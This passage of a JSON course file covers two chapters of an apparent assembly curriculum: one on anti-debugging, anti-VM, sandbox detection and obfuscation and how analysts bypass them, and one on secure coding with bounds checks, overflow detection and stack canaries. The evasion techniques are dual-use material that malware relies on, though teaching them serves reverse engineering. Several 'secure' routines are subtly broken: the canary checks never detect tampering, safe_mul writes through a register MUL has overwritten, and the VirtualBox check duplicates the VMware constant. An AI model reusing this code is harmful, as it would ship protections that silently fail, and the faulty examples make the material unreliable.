      },
      {
        "id": "sec-43-2-3",
        "title": "43.2.3 VM Artifacts",
        "content": "",
        "tableData": {
          "headers": [
            "VM Type",
            "Detection Artifacts"
          ],
          "rows": [
            [
              "VMware",
              "VMware tools, registry keys, MAC prefix 00:0C:29"
            ],
            [
              "VirtualBox",
              "VBoxGuest, VBoxTray, registry keys"
            ],
            [
              "Hyper-V",
              "HvService, VMIC service"
            ],
            [
              "QEMU",
              "QEMU Guest Agent"
            ]
          ]
        }
      },
      {
        "id": "sec-43-2-4",
        "title": "43.2.4 Registry Keys (Windows)",
        "content": "",
        "codeSnippets": [
          {
            "title": "Registry Keys (Windows) — example",
            "language": "nasm",
            "code": "// VMware\nHKEY_LOCAL_MACHINE\\SOFTWARE\\VMware, Inc.\\VMware Tools\n\n// VirtualBox\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\n\n// Hyper-V\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"
          }
        ]
      },
      {
        "id": "sec-43-2-5",
        "title": "43.2.5 File System Artifacts",
        "content": "",
        "codeSnippets": [
          {
            "title": "File System Artifacts — example",
            "language": "c",
            "code": "// Common VM files\nchar *vm_files[] = {\n    \"/usr/bin/vmtoolsd\",           // VMware\n    \"/usr/bin/VBoxClient\",         // VirtualBox\n    \"/mnt/.guestfs\",              // Guest additions\n    \"/proc/scsi/scsi\",           // Virtual SCSI\n    NULL\n};"
          }
        ]
      },
      {
        "id": "sec-43-2-6",
        "title": "43.2.6 MAC Address Prefixes",
        "content": "VMware:     00:0C:29, 00:50:56\nVirtualBox: 08:00:27\nHyper-V:    00:15:5D"
      },
      {
        "id": "sec-43-2-7",
        "title": "43.2.7 Timing-Based Detection",
        "content": "VMs introduce timing overhead:",
        "codeSnippets": [
          {
            "title": "Timing-Based Detection — example",
            "language": "c",
            "code": "uint64_t start = __rdtsc();\n// Execute code\nuint64_t end = __rdtsc();\nuint64_t cycles = end - start;\nif (cycles > THRESHOLD) {\n    // Possible VM or sandbox\n}"
          }
        ]
      },
      {
        "id": "sec-43-2-8",
        "title": "43.2.8 Sandbox Detection",
        "content": "• Check for analysis tools (Wireshark, Process Monitor)\n• Check system uptime (sandboxes restart frequently)\n• Check user interaction (mouse movements)\n• Check network connectivity\n• Check for minimum hardware specs"
      },
      {
        "id": "sec-43-2-9",
        "title": "43.2.9 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "c",
            "title": "VM Detection Example",
            "code": "#include <stdio.h>\n#include <string.h>\n#include <cpuid.h>\n\nint check_vm() {\n    unsigned int eax, ebx, ecx, edx;\n    \n    // Check hypervisor bit\n    __cpuid(1, eax, ebx, ecx, edx);\n    if ((ecx >> 31) & 1) {\n        return 1;  // Hypervisor detected\n    }\n    \n    // Check VMware backdoor\n    __cpuid(0x40000000, eax, ebx, ecx, edx);\n    if (eax == 0x564D5868) {  // \"VMXh\"\n        return 1;\n    }\n    \n    // Check VirtualBox\n    __cpuid(0x40000000, eax, ebx, ecx, edx);\n    if (eax == 0x564D5868 && ebx == 0x564D5868) {\n        return 1;\n    }\n    \n    return 0;\n}\n\nint check_vm_artifacts() {\n    char *artifacts[] = {\n        \"/usr/bin/vmtoolsd\",\n        \"/usr/bin/VBoxClient\",\n        \"/mnt/.guestfs\",\n        NULL\n    };\n    \n    for (int i = 0; artifacts[i] != NULL; i++) {\n        if (access(artifacts[i], F_OK) == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}"
          }
        ]
      },
      {
        "id": "sec-43-3",
        "title": "43.3 Anti-Disassembly and Obfuscation",
        "content": "Techniques to confuse static analysis tools and human analysts."
      },
      {
        "id": "sec-43-3-1",
        "title": "43.3.1 Junk Byte Insertion",
        "content": "Add meaningless bytes that confuse disassemblers:",
        "codeSnippets": [
          {
            "title": "Junk Byte Insertion — example",
            "language": "nasm",
            "code": "jmp .real_code\ndb 0xE8          ; Looks like 'call' opcode to linear disassembler\n.real_code:\n    mov rax, 60"
          }
        ]
      },
      {
        "id": "sec-43-3-2",
        "title": "43.3.2 Overlapping Instructions",
        "content": "Create multiple valid disassembly paths:",
        "codeSnippets": [
          {
            "title": "Overlapping Instructions — example",
            "language": "nasm",
            "code": "db 0xEB, 0x01    ; JMP +1 (skips next byte)\ndb 0xE8          ; Junk byte\n; Actual code:\n    mov eax, 1"
          }
        ]
      },
      {
        "id": "sec-43-3-3",
        "title": "43.3.3 Opaque Predicates",
        "content": "Branches that always evaluate the same way:",
        "codeSnippets": [
          {
            "title": "Opaque Predicates — example",
            "language": "nasm",
            "code": "xor eax, eax      ; EAX = 0\ntest eax, eax      ; ZF = 1\njz .always_taken   ; Always taken (dead code below)\n; Dead code (never executed):\n    mov rax, 999\n.always_taken:\n    ; Real code here"
          }
        ]
      },
      {
        "id": "sec-43-3-4",
        "title": "43.3.4 Control Flow Flattening",
        "content": "Transform structured code into state machine:",
        "codeSnippets": [
          {
            "title": "Control Flow Flattening — example",
            "language": "c",
            "code": "// Original\nif (a > b) {\n    x = 1;\n} else {\n    x = 2;\n}"
          },
          {
            "title": "Control Flow Flattening — example",
            "language": "nasm",
            "code": "// Flattened\nint state = 0;\nwhile (1) {\n    switch(state) {\n        case 0: state = (a > b) ? 1 : 2; break;\n        case 1: x = 1; state = 3; break;\n        case 2: x = 2; state = 3; break;\n        case 3: goto done;\n    }\n}\ndone:"
          }
        ]
      },
      {
        "id": "sec-43-3-5",
        "title": "43.3.5 String Encryption",
        "content": "Encrypt strings and decrypt at runtime:\n\nchar encrypted[] = {0x52, 0x45, 0x56, 0x45, 0x4E, 0x53, 0x45}; // XOR with 0x41",
        "codeSnippets": [
          {
            "title": "String Encryption — example",
            "language": "nasm",
            "code": "// Decrypted: \"REVERSE\""
          }
        ]
      },
      {
        "id": "sec-43-3-6",
        "title": "43.3.6 Code Virtualization",
        "content": "Custom virtual machine to interpret bytecode:\n• Bytecode is not real machine code\n• Requires custom VM to execute\n• Very hard to reverse engineer\n• Used in commercial protectors (Themida, VMProtect)"
      },
      {
        "id": "sec-43-3-7",
        "title": "43.3.7 Anti-Analysis Tools",
        "content": "",
        "tableData": {
          "headers": [
            "Tool",
            "Detection Method"
          ],
          "rows": [
            [
              "IDA Pro",
              "Check for IDA-specific patterns"
            ],
            [
              "OllyDbg",
              "Check for OllyDbg window"
            ],
            [
              "GDB",
              "ptrace/TracerPid checks"
            ],
            [
              "Wireshark",
              "Check for capture driver"
            ],
            [
              "Wireshark",
              "Process name check"
            ]
          ]
        }
      },
      {
        "id": "sec-43-3-8",
        "title": "43.3.8 Bypassing Anti-Analysis",
        "content": "1. Patch checks (NOP out jumps)\n2. Modify return values (set EAX=0)\n3. Use dynamic instrumentation (Frida, DynamoRIO)\n4. Modify analysis environment (remove artifacts)\n5. Use unpackers/deobfuscators"
      },
      {
        "id": "sec-43-3-9",
        "title": "43.3.9 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Anti-Disassembly Example",
            "code": "section .text\n    global _start\n\n_start:\n    ; Opaque predicate\n    xor eax, eax        ; EAX = 0\n    test eax, eax        ; ZF = 1\n    jnz .fake_path       ; Never taken\n    \n    ; Real code\n    mov rax, 60\n    xor rdi, rdi\n    syscall\n    \n.fake_path:\n    ; Dead code (never executes)\n    ; Confuses linear disassembly\n    jmp .real_code\n    db 0xE8, 0x12, 0x34, 0x56, 0x78  ; Junk bytes\n    \n.real_code:\n    mov rax, 60\n    xor rdi, rdi\n    syscall"
          }
        ]
      },
      {
        "id": "sec-43-4",
        "title": "43.4 Bypassing Anti-Debugging",
        "content": "Analysts use various techniques to overcome anti-debugging."
      },
      {
        "id": "sec-43-4-1",
        "title": "43.4.1 GDB Bypass Techniques",
        "content": "1. Patch Instructions: NOP out check instructions\n2. Modify Registers: Change return values (set $eax = 0)\n3. Hardware Breakpoints: Avoid software breakpoint detection\n4. Modify Memory: Change TracerPid in /proc/self/status\n5. Custom GDB Scripts: Automate bypass"
      },
      {
        "id": "sec-43-4-2",
        "title": "43.4.2 Patching Anti-Debugging",
        "content": "",
        "codeSnippets": [
          {
            "title": "Patching Anti-Debugging — example",
            "language": "nasm",
            "code": "# Find check function\nobjdump -d binary | grep -A 10 \"ptrace\"\n\n# Patch with NOP\nprintf '\\x90\\x90\\x90\\x90\\x90' | dd of=binary bs=1 seek=OFFSET conv=notrunc"
          }
        ]
      },
      {
        "id": "sec-43-4-3",
        "title": "43.4.3 GDB Script for Bypass",
        "content": "",
        "codeSnippets": [
          {
            "title": "GDB Script for Bypass — example",
            "language": "bash",
            "code": "# bypass_anti_debug.gdb\nset follow-fork-mode child\nset detach-on-fork off"
          },
          {
            "title": "GDB Script for Bypass — example",
            "language": "nasm",
            "code": "# Before ptrace check\nb *0x401000\ncommands\n    set $eax = 0\n    continue\nend\n\n# Before TracerPid check\nb *0x401050\ncommands\n    # Write \"TracerPid: 0\" to /proc/self/status\n    # (Complex, better to patch binary)\nend"
          }
        ]
      },
      {
        "id": "sec-43-4-4",
        "title": "43.4.4 Using Frida for Dynamic Instrumentation",
        "content": "",
        "codeSnippets": [
          {
            "title": "Using Frida for Dynamic Instrumentation — example",
            "language": "c",
            "code": "// Frida script to bypass anti-debug\nInterceptor.attach(Module.findExportByName(null, \"ptrace\"), {\n    onEnter: function(args) {\n        this.is_traceme = (args[0].toInt32() == 0);\n    },\n    onLeave: function(retval) {\n        if (this.is_traceme) {\n            retval.replace(0);  // Fake success\n        }\n    }\n});"
          }
        ]
      },
      {
        "id": "sec-43-4-5",
        "title": "43.4.5 Binary Ninja / Radare2 Patching",
        "content": "",
        "codeSnippets": [
          {
            "title": "Binary Ninja / Radare2 Patching — example",
            "language": "nasm",
            "code": "# Radare2: Patch instruction to NOP\nr2 -w binary\nafl  # List functions\ns 0x401000  # Seek to check\nwa nop      # Write NOP\nq           # Quit"
          }
        ]
      },
      {
        "id": "sec-43-4-6",
        "title": "43.4.6 Anti-VM Bypass",
        "content": "1. Run on bare metal (no VM)\n2. Hide VM artifacts (rename files, modify registry)\n3. Spoof CPUID results\n4. Use VM escape techniques\n5. Modify timing behavior"
      },
      {
        "id": "sec-43-4-7",
        "title": "43.4.7 Complete Bypass Workflow",
        "content": "1. Identify anti-debugging checks\n2. Locate check functions in binary\n3. Patch or hook checks\n4. Verify bypass works\n5. Test program functionality"
      },
      {
        "id": "sec-43-4-8",
        "title": "43.4.8 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "GDB Bypass Automation",
            "code": "#!/bin/bash\n# bypass_debug.sh - Automated anti-debug bypass\n\nBINARY=$1\n\n# Create GDB script\ncat > bypass.gdb << 'EOF'\nset pagination off\nset confirm off\n\n# Find and patch ptrace check\n# (Adjust addresses for your binary)\nb *0x401000\ncommands\n    silent\n    set $eax = 0\n    continue\nend\n\n# Find and patch TracerPid check\nb *0x401050\ncommands\n    silent\n    # Skip the check\n    set $rip = 0x401080\n    continue\nend\n\n# Run\nrun\nEOF\n\n# Run GDB with script\ngdb -x bypass.gdb $BINARY"
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-43-1",
        "title": "Exercise 43.1: Bypass ptrace Check in GDB",
        "description": "Bypass a ptrace check by setting rax=0 or patching the conditional branch.",
        "solution": "In GDB: break _start -> stepi past syscall -> set $rax = 0 -> continue. Or patch the js branch to nop nop."
      },
      {
        "id": "ex-43-2",
        "title": "Exercise 43.2: VM Detection",
        "description": "Write a program that detects if running in a VMware virtual machine.",
        "solution": "Check CPUID hypervisor bit (ecx bit 31). Check for VMware MAC prefix (00:0C:29). Check for VMware tools installation. Check registry keys on Windows."
      },
      {
        "id": "ex-43-3",
        "title": "Exercise 43.3: Anti-Disassembly Bypass",
        "description": "Identify and bypass a junk byte anti-disassembly technique.",
        "solution": "Find jmp over junk bytes, patch jmp to nop or modify disassembler to skip junk bytes. Use IDA Pro or Binary Ninja with manual analysis to trace actual execution path."
      },
      {
        "id": "ex-43-4",
        "title": "Exercise 43.4: Timing Check Bypass",
        "description": "Explain how to bypass timing-based anti-debugging.",
        "solution": "Modify rdtsc/cpuid cycle count by: (1) Patching timing checks, (2) Using hardware performance counters, (3) Running in VM with constant TSC, (4) Hooking timing functions to return consistent values."
      }
    ],
    "practiceQuestions": [
      {
        "question": "How do timing checks detect debugger presence?",
        "answer": "Human-driven breakpoints and single-stepping take millions of clock cycles compared to bare CPU execution. Instructions like rdtsc measure cycles elapsed across a code block; an abnormally high difference signals active debugging. Debuggers introduce significant overhead that timing checks can detect."
      },
      {
        "question": "What is ptrace and how does it detect debuggers?",
        "answer": "ptrace is the Linux debugging API used by debuggers like GDB. When a program calls ptrace(PTRACE_TRACEME), it allows debugging. If a debugger is already attached, ptrace fails with EPERM. Malware uses this to detect debuggers by checking if ptrace(PTRACE_TRACEME) fails."
      },
      {
        "question": "How do opaque predicates confuse disassemblers?",
        "answer": "Opaque predicates are branches that always evaluate the same way (always true or always false) but are not obvious to static analysis. They create dead code paths that confuse disassemblers, making control flow analysis difficult. The analyst must determine which paths are actually taken."
      },
      {
        "question": "What are common VM detection techniques?",
        "answer": "Common techniques include: CPUID hypervisor bit check, MAC address prefix detection (VMware: 00:0C:29), checking for VM tools (vmtoolsd, VBoxClient), examining registry keys, timing analysis (VMs have overhead), and checking for VM-specific hardware devices."
      },
      {
        "question": "How can anti-disassembly be bypassed?",
        "answer": "Bypass techniques include: (1) Manual analysis to trace actual execution path, (2) Patching junk bytes or overlapping instructions, (3) Using advanced disassemblers (IDA Pro) with manual analysis, (4) Dynamic analysis with debuggers to follow actual control flow, (5) Using deobfuscation tools."
      },
      {
        "question": "What is code virtualization and why is it used?",
        "answer": "Code virtualization transforms code into custom bytecode executed by a virtual machine. It is used in commercial software protection (Themida, VMProtect) because the bytecode is not standard machine code, making reverse engineering extremely difficult. Analysts must understand the custom VM to analyze the code."
      }
    ],
    "summary": [
      "Anti-debugging detects or prevents debugger attachment.",
      "ptrace and TracerPid are common Linux debugging detection methods.",
      "Anti-VM detects virtualization environments via artifacts and timing.",
      "Anti-disassembly uses junk bytes and overlapping instructions.",
      "Opaque predicates create dead code paths to confuse analysis.",
      "Bypassing requires patching, hooking, or dynamic instrumentation.",
      "Anti-analysis is essential for software protection and malware evasion.",
      "Understanding anti-analysis helps both defenders and attackers."
    ]
  },
  {
    "id": 44,
    "slug": "chapter-44-secure-coding-defensive-assembly",
    "level": 8,
    "levelTitle": "Security and Binary Exploitation",
    "title": "Chapter 44: Secure Coding and Defensive Assembly",
    "subtitle": "Bounds Checking, Arithmetic Overflow Verification, Manual Canaries, and RELRO",
    "learningObjectives": [
      "Understand secure coding principles for assembly and low-level programming.",
      "Apply defensive programming standards to pure assembly and C interop code.",
      "Implement bounds-checked string and memory copy routines.",
      "Verify integer overflow on arithmetic using jo and jc flags.",
      "Implement custom stack canaries with getrandom syscall (318).",
      "Understand and apply compiler security flags.",
      "Learn input validation and sanitization techniques.",
      "Study secure memory handling and zeroization."
    ],
    "prerequisites": [
      "Chapters 1–43"
    ],
    "keyConcepts": [
      "Bounds checking: Prevent memory writes beyond buffer allocations.",
      "Arithmetic overflow: Integer operations exceeding type size.",
      "Stack canaries: Random values to detect stack smashing.",
      "RELRO: Read-only GOT to prevent function pointer hijacking.",
      "Input validation: Verify all external inputs before use.",
      "Memory zeroization: Clear sensitive data after use.",
      "Secure coding standards: CERT C, MISRA, SEI guidelines.",
      "Defense in depth: Multiple security layers."
    ],
    "diagramType": "defensive_assembly",
    "sections": [
      {
        "id": "sec-44-1",
        "title": "44.1 Bounds Checking and Input Validation",
        "content": "Preventing buffer overflows requires rigorous bounds checking."
      },
      {
        "id": "sec-44-1-1",
        "title": "44.1.1 Why Bounds Checking?",
        "content": "• Prevents buffer overflows\n• Stops out-of-bounds reads/writes\n• Protects against integer overflow in size calculations\n• Essential for secure string handling"
      },
      {
        "id": "sec-44-1-2",
        "title": "44.1.2 Bounds-Checked String Copy",
        "content": "Always verify destination buffer size:",
        "codeSnippets": [
          {
            "title": "Bounds-Checked String Copy — example",
            "language": "nasm",
            "code": "; safe_strcpy: rdi=dest, rsi=src, rdx=dest_size\nsafe_strcpy:\n    push rdi; push rsi; push rbx\n    mov rbx, rdx        ; remaining space\n    xor eax, eax\n.loop:\n    cmp rbx, 1\n    jle .truncated      ; leave 1 byte for null\n    mov cl, [rsi]\n    mov [rdi], cl\n    inc rsi; inc rdi; dec rbx\n    test cl, cl; jz .done\n    jmp .loop\n.truncated:\n    mov byte [rdi], 0   ; guarantee null terminator\n    mov eax, -1\n.done:\n    pop rbx; pop rsi; pop rdi; ret"
          }
        ]
      },
      {
        "id": "sec-44-1-3",
        "title": "44.1.3 Input Validation Patterns",
        "content": "1. Length checks: Verify input length before copy\n2. Character validation: Check for allowed characters\n3. Range validation: Verify numeric values within bounds\n4. Format validation: Ensure expected structure\n5. Null termination: Always ensure strings are null-terminated"
      },
      {
        "id": "sec-44-1-4",
        "title": "44.1.4 Safe Memory Operations",
        "content": "",
        "codeSnippets": [
          {
            "title": "Safe Memory Operations — example",
            "language": "nasm",
            "code": "; memcpy with bounds check\n; rdi=dest, rsi=src, rdx=size, rcx=dest_size\nsafe_memcpy:\n    cmp rdx, rcx\n    ja .overflow        ; size > dest_size\n    ; Proceed with memcpy\n    ..."
          }
        ]
      },
      {
        "id": "sec-44-1-5",
        "title": "44.1.5 Integer Overflow Prevention",
        "content": "Integer overflow in size calculations causes underallocation:",
        "codeSnippets": [
          {
            "title": "Integer Overflow Prevention — example",
            "language": "c",
            "code": "// VULNERABLE\nsize_t total = count * sizeof(int);  // Can overflow!\nint *arr = malloc(total);\n\n// SAFE\nif (count > SIZE_MAX / sizeof(int)) {\n    return NULL;  // Overflow check\n}\nsize_t total = count * sizeof(int);"
          }
        ]
      },
      {
        "id": "sec-44-1-6",
        "title": "44.1.6 Compiler Built-in Checks",
        "content": "",
        "codeSnippets": [
          {
            "title": "Compiler Built-in Checks — example",
            "language": "c",
            "code": "// GCC/Clang overflow-checked arithmetic\nint result;\nif (__builtin_add_overflow(a, b, &result)) {\n    // Overflow occurred\n}\n\nif (__builtin_mul_overflow(a, b, &result)) {\n    // Overflow occurred\n}"
          }
        ]
      },
      {
        "id": "sec-44-1-7",
        "title": "44.1.7 Fuzzing for Bounds Checking",
        "content": "Use fuzzing to find bounds violations:\n• AFL (American Fuzzy Lop)\n• libFuzzer\n• Honggfuzz\n• Microsoft OneFuzz"
      },
      {
        "id": "sec-44-1-8",
        "title": "44.1.8 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Bounds-Checked Functions",
            "code": "; safe_strncpy: Guaranteed null-terminated, bounds-checked\n; rdi=dest, rsi=src, rdx=dest_size\nglobal safe_strncpy\nsection .text\nsafe_strncpy:\n    push rdi\n    push rsi\n    push rcx\n    push rbx\n    \n    mov rbx, rdx        ; dest_size\n    test rbx, rbx\n    jz .overflow\n    \n.copy_loop:\n    dec rbx\n    jz .truncated\n    lodsb               ; AL = [RSI], RSI++\n    stosb               ; [RDI] = AL, RDI++\n    test al, al\n    jnz .copy_loop\n    jmp .done\n    \n.truncated:\n    mov byte [rdi-1], 0  ; Ensure null termination\n    mov eax, -1          ; Return truncation error\n    jmp .cleanup\n    \n.overflow:\n    xor eax, eax         ; Return 0 on zero-size\n    jmp .cleanup\n    \n.done:\n    xor eax, eax         ; Return success\n    \n.cleanup:\n    pop rbx\n    pop rcx\n    pop rsi\n    pop rdi\n    ret\n\n; memset with bounds check\n; rdi=dest, sil=value, rdx=size, rcx=dest_size\nsafe_memset:\n    cmp rdx, rcx\n    ja .overflow\n    ; Proceed with memset\n    mov rcx, rdx\n    mov al, sil\n    rep stosb\n    xor eax, eax\n    ret\n.overflow:\n    mov eax, -1\n    ret"
          }
        ]
      },
      {
        "id": "sec-44-2",
        "title": "44.2 Arithmetic Overflow Detection",
        "content": "Detecting integer overflow is critical for secure arithmetic."
      },
      {
        "id": "sec-44-2-1",
        "title": "44.2.1 Why Integer Overflow is Dangerous",
        "content": "• Buffer size underallocation\n• Unexpected negative values\n• Bypass of security checks\n• Logic errors in comparisons"
      },
      {
        "id": "sec-44-2-2",
        "title": "44.2.2 x86-64 Overflow Detection Flags",
        "content": "",
        "tableData": {
          "headers": [
            "Flag",
            "Name",
            "Set When"
          ],
          "rows": [
            [
              "OF",
              "Overflow Flag",
              "Signed overflow"
            ],
            [
              "CF",
              "Carry Flag",
              "Unsigned overflow"
            ],
            [
              "ZF",
              "Zero Flag",
              "Result is zero"
            ],
            [
              "SF",
              "Sign Flag",
              "Result is negative"
            ]
          ]
        }
      },
      {
        "id": "sec-44-2-3",
        "title": "44.2.3 Detecting Signed Overflow (jo/jno)",
        "content": "",
        "codeSnippets": [
          {
            "title": "Detecting Signed Overflow (jo/jno) — example",
            "language": "nasm",
            "code": "; Safe addition with overflow detection\n; rdi=a, rsi=b, rdx=ptr_to_result\nsafe_add:\n    mov rax, rdi\n    add rax, rsi\n    jo .overflow        ; Jump if signed overflow\n    mov [rdx], rax\n    xor eax, eax        ; Return success\n    ret\n.overflow:\n    mov eax, -1         ; Return error\n    ret"
          }
        ]
      },
      {
        "id": "sec-44-2-4",
        "title": "44.2.4 Detecting Unsigned Overflow (jc/jnc)",
        "content": "",
        "codeSnippets": [
          {
            "title": "Detecting Unsigned Overflow (jc/jnc) — example",
            "language": "nasm",
            "code": "; Safe multiplication with overflow detection\n; rdi=a, rsi=b, rdx=ptr_to_result\nsafe_mul:\n    mov rax, rdi\n    mul rsi             ; RDX:RAX = RAX * RSI\n    jc .overflow        ; Jump if unsigned overflow (RDX != 0)\n    mov [rdx], rax\n    xor eax, eax\n    ret\n.overflow:\n    mov eax, -1\n    ret"
          }
        ]
      },
      {
        "id": "sec-44-2-5",
        "title": "44.2.5 Compiler Built-in Overflow Checks",
        "content": "",
        "codeSnippets": [
          {
            "title": "Compiler Built-in Overflow Checks — example",
            "language": "c",
            "code": "// GCC/Clang built-in functions\nint result;\n\n// Addition\nif (__builtin_add_overflow(a, b, &result)) {\n    handle_overflow();\n}\n\n// Multiplication\nif (__builtin_mul_overflow(a, b, &result)) {\n    handle_overflow();\n}\n\n// Subtraction\nif (__builtin_sub_overflow(a, b, &result)) {\n    handle_overflow();\n}"
          }
        ]
      },
      {
        "id": "sec-44-2-6",
        "title": "44.2.6 Safe Integer Library Pattern",
        "content": "typedef struct {\n\nsafe_int safe_add(safe_int a, safe_int b) {",
        "codeSnippets": [
          {
            "title": "Safe Integer Library Pattern — example",
            "language": "nasm",
            "code": "    int64_t value;\n    int overflow;\n} safe_int;\n\n    safe_int result;\n    result.overflow = a.overflow || b.overflow;\n    if (!result.overflow) {\n        result.value = a.value + b.value;\n        result.overflow = (result.value < a.value) != (b.value > 0);\n    }\n    return result;\n}"
          }
        ]
      },
      {
        "id": "sec-44-2-7",
        "title": "44.2.7 Common Integer Overflow Vulnerabilities",
        "content": "1. **malloc(count * size): Multiplication overflow\n2. Array indexing: Signed/unsigned confusion\n3. Buffer length calculations: Subtraction underflow\n4. Loop counters: Increment overflow\n5. Time calculations**: Wraparound issues"
      },
      {
        "id": "sec-44-2-8",
        "title": "44.2.8 Mitigation Strategies",
        "content": "• Use safe integer libraries\n• Check arithmetic operations with jo/jc\n• Validate all size calculations before allocation\n• Use larger types for intermediate results\n• Fuzz with extreme values"
      },
      {
        "id": "sec-44-2-9",
        "title": "44.2.9 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Safe Arithmetic Functions",
            "code": "; safe_add: Signed addition with overflow detection\n; Input: rdi=a, rsi=b, rdx=ptr_to_result\n; Output: eax=0 success, eax=-1 overflow\nglobal safe_add\nsection .text\nsafe_add:\n    mov rax, rdi\n    add rax, rsi\n    jo .overflow\n    mov [rdx], rax\n    xor eax, eax\n    ret\n.overflow:\n    mov eax, -1\n    ret\n\n; safe_mul: Unsigned multiplication with overflow detection\n; Input: rdi=a, rsi=b, rdx=ptr_to_result\nglobal safe_mul\nsection .text\nsafe_mul:\n    mov rax, rdi\n    mul rsi             ; RDX:RAX = RAX * RSI\n    test rdx, rdx       ; Check high 64 bits\n    jnz .overflow\n    mov [rdx], rax\n    xor eax, eax\n    ret\n.overflow:\n    mov eax, -1\n    ret\n\n; safe_sub: Signed subtraction with underflow detection\n; Input: rdi=a, rsi=b, rdx=ptr_to_result\nglobal safe_sub\nsection .text\nsafe_sub:\n    mov rax, rdi\n    sub rax, rsi\n    jo .overflow\n    mov [rdx], rax\n    xor eax, eax\n    ret\n.overflow:\n    mov eax, -1\n    ret"
          }
        ]
      },
      {
        "id": "sec-44-3",
        "title": "44.3 Stack Canaries and RELRO",
        "content": "Modern compile-time protections against memory corruption."
      },
      {
        "id": "sec-44-3-1",
        "title": "44.3.1 Stack Canaries (Stack Protector)",
        "content": "Random value placed before saved return address:",
        "codeSnippets": [
          {
            "title": "Stack Canaries (Stack Protector) — example",
            "language": "nasm",
            "code": "; Function prologue\npush rbp\nmov rbp, rsp\nsub rsp, 32\nmov rax, qword [fs:0x28]    ; Load canary\nmov qword [rbp-8], rax       ; Store in stack frame\n\n; Function epilogue\nmov rax, qword [rbp-8]       ; Load canary\nxor rax, qword [fs:0x28]    ; Compare with master\njnz .stack_chk_fail          ; Abort if modified\nleave\nret"
          }
        ]
      },
      {
        "id": "sec-44-3-2",
        "title": "44.3.2 Custom Stack Canary Implementation",
        "content": "",
        "codeSnippets": [
          {
            "title": "Custom Stack Canary Implementation — example",
            "language": "nasm",
            "code": "; Custom canary using getrandom syscall\nsection .text\nglobal _start\n\n_start:\n    ; Allocate stack frame\n    push rbp\n    mov rbp, rsp\n    sub rsp, 16\n\n; Generate random canary\n    mov rax, 318        ; sys_getrandom\n    lea rdi, [rbp-8]    ; Buffer for canary\n    mov rsi, 8          ; 8 bytes\n    xor rdx, rdx        ; Flags = 0\n    syscall\n\n; Store canary\n    mov rax, qword [rbp-8]\n\n; ... function body ...\n\n; Verify canary\n    mov rcx, qword [rbp-8]\n    xor rcx, qword [rbp-8]  ; Compare\n    jnz .canary_breach\n\n; Return\n    leave\n    ret\n\n.canary_breach:\n    ; Canary corrupted! Abort\n    mov rax, 60\n    mov rdi, 1\n    syscall"
          }
        ]
      },
      {
        "id": "sec-44-3-3",
        "title": "44.3.3 RELRO (Relocation Read-Only)",
        "content": "Protects GOT (Global Offset Table) from modification:\n\nPartial RELRO (default):\n• GOT is writable\n• .dynamic section is read-only\n• Partial protection\n\nFull RELRO (-z relro -z now):\n• GOT is read-only after startup\n• All symbols resolved at startup\n• Strong protection against GOT hijacking"
      },
      {
        "id": "sec-44-3-4",
        "title": "44.3.4 Compiler Security Flags",
        "content": "",
        "codeSnippets": [
          {
            "title": "Compiler Security Flags — example",
            "language": "bash",
            "code": "# Stack canary\ngcc -fstack-protector-strong -o binary source.c\n\n# NX (No-Execute)\ngcc -z noexecstack -o binary source.c\n\n# RELRO\ngcc -z relro -z now -o binary source.c\n\n# PIE (Position-Independent Executable)\ngcc -pie -fPIE -o binary source.c\n\n# Fortify Source\ngcc -D_FORTIFY_SOURCE=2 -o binary source.c\n\n# Full protection\ngcc -fstack-protector-strong -z noexecstack -z relro -z now     -pie -fPIE -D_FORTIFY_SOURCE=2 -o binary source.c"
          }
        ]
      },
      {
        "id": "sec-44-3-5",
        "title": "44.3.5 Checking Protections",
        "content": "",
        "codeSnippets": [
          {
            "title": "Checking Protections — example",
            "language": "nasm",
            "code": "# checksec tool\nchecksec --file=binary\n\n# readelf for NX\nreadelf -l binary | grep GNU_STACK\n\n# readelf for PIE\nreadelf -h binary | grep Type\n\n# readelf for RELRO\nreadelf -l binary | grep GNU_RELRO"
          }
        ]
      },
      {
        "id": "sec-44-3-6",
        "title": "44.3.6 Limitations of Protections",
        "content": "",
        "tableData": {
          "headers": [
            "Protection",
            "Bypass Technique"
          ],
          "rows": [
            [
              "Stack canary",
              "Leak canary value"
            ],
            [
              "NX/DEP",
              "ROP, ret2libc"
            ],
            [
              "ASLR",
              "Information leak"
            ],
            [
              "PIE",
              "Code leak"
            ],
            [
              "RELRO",
              "Data-only attacks"
            ]
          ]
        }
      },
      {
        "id": "sec-44-3-7",
        "title": "44.3.7 Code examples",
        "content": "",
        "codeSnippets": [
          {
            "language": "nasm",
            "title": "Custom Canary Implementation",
            "code": "; Custom stack canary with getrandom\nsection .bss\n    canary_value: resq 1\n\nsection .text\nglobal init_canary\nglobal check_canary\n\n; Initialize canary (call once at program start)\ninit_canary:\n    push rax\n    push rdi\n    push rsi\n    push rdx\n    \n    mov rax, 318            ; sys_getrandom\n    lea rdi, [canary_value] ; Buffer\n    mov rsi, 8              ; 8 bytes\n    xor rdx, rdx            ; Flags = 0\n    syscall\n    \n    ; Ensure canary has null byte in low byte\n    ; (for string function protection)\n    mov byte [canary_value], 0\n    \n    pop rdx\n    pop rsi\n    pop rdi\n    pop rax\n    ret\n\n; Check canary (call before return)\ncheck_canary:\n    push rax\n    push rcx\n    \n    mov rax, qword [canary_value]\n    mov rcx, [rsp+16]       ; Saved RBP from stack frame\n    xor rax, rcx\n    jnz .breach\n    \n    pop rcx\n    pop rax\n    ret\n    \n.breach:\n    ; Canary corrupted - abort\n    mov rax, 60\n    mov rdi, 1\n    syscall"
          }
        ]
      },
      {
        "id": "sec-44-4",
        "title": "44.4 Secure Memory Handling",
        "content": "Protecting sensitive data in memory."
      },
      {
        "id": "sec-44-4-1",
        "title": "44.4.1 Why Secure Memory Handling?",
        "content": "• Prevent sensitive data leakage\n• Stop memory dump analysis\n• Protect cryptographic keys\n• Clear passwords from memory"
      },
      {
        "id": "sec-44-4-2",
